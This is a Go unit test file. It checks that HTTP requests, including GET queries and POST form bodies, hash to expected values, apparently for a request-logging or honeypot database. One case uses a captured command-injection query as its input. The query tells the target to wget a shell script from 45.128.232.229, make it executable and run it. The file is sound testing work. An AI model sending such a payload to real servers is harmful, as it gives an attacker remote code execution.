package database

import (
	"testing"

	"github.com/jackc/pgx/v5/pgtype"
)

func TestHashRequestOk(t *testing.T) {

	for _, test := range []struct {
		description  string
		testRequest  Request
		expectedHash string
	}{
		{
			description: "simple request hashes ok",
			testRequest: Request{
				Method:  "GET",
				Path:    "/foo",
				Headers: pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				Query:   "aa=bb&cc=dd",
			},
			expectedHash: "5574171b47fbd5919b72e75c59d82220b621b25a1343807870ae8d5d4ec751db",
		},
		{
			description: "parses weird query OK",
			testRequest: Request{
				Method:  "GET",
				Path:    "/rssui/public/rssdb_dump.xml",
				Headers: pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				Query:   "path=%22;cd%20%2Fvar%3Bwget%20http%3A%2F%2F45.128.232.229%2Fcgi-dns.sh%3Bchmod%20%2Bx%20cgi-dns.sh%3Bsh%20cgi-dns.sh%22",
			},
			expectedHash: "0b2103a9d4577e2fba8390acc4da751b83708d7048e0b3db68380aca831b2db6",
		},
		{
			description: "simple request hashes ok, different query values, same hash",
			testRequest: Request{
				Method:  "GET",
				Path:    "/foo",
				Headers: pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				Query:   "aa=yy&cc=rr",
			},
			expectedHash: "5574171b47fbd5919b72e75c59d82220b621b25a1343807870ae8d5d4ec751db",
		},
		{
			description: "POST request hashes ok",
			testRequest: Request{
				Method:      "POST",
				Path:        "/foo",
				Headers:     pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				ContentType: "application/x-www-form-urlencoded",
				Body:        []byte("aa=yy&cc=rr"),
				Query:       "foo=bar",
			},
			expectedHash: "d1c79609eb9124762aca5ea450c13ad9139f100b52742eb22fa7938ea2b73507",
		},
		{
			description: "POST request hashes ok, different body values",
			testRequest: Request{
				Method:      "POST",
				Path:        "/foo",
				Headers:     pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				ContentType: "application/x-www-form-urlencoded",
				Body:        []byte("aa=AAAA&cc=XXXX"),
				Query:       "foo=bar",
			},
			expectedHash: "d1c79609eb9124762aca5ea450c13ad9139f100b52742eb22fa7938ea2b73507",
		},
		{
			description: "POST request hashes ok, no query",
			testRequest: Request{
				Method:      "POST",
				Path:        "/foo",
				Headers:     pgtype.FlatArray[string]{"X-Foo: bar", "X-Bar: baz"},
				ContentType: "application/x-www-form-urlencoded",
				Body:        []byte("aa=AAAA&cc=XXXX"),
				Query:       "",
			},
			expectedHash: "bfba7c50e586a84479576e2bdf673421f80ed0052f79404ef24b0f0509302d0e",
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			sum, err := GetHashFromStaticRequestFields(&test.testRequest)
			if err != nil {
				t.Errorf("unexpected error: %s", err)
			}
			if sum != test.expectedHash {
				t.Errorf("expected sum %s, got %s", test.expectedHash, sum)
			}
		})
	}
}
